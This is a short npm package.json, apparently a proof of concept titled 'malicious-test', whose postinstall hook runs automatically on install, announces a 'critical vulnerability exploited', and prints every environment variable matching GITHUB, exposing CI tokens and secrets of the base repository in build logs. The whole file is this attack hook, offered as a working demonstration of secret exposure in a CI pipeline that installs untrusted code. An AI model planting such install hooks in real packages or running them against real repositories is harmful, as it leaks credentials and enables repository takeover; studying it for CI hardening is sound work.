{
  "name": "malicious-test",
  "scripts": {
    "postinstall": "echo '🚨🚨🚨 CRITICAL VULNERABILITY EXPLOITED 🚨🚨🚨'; echo 'This script is running with the base repositorys secrets and permissions!'; printenv | grep GITHUB"
  }
}
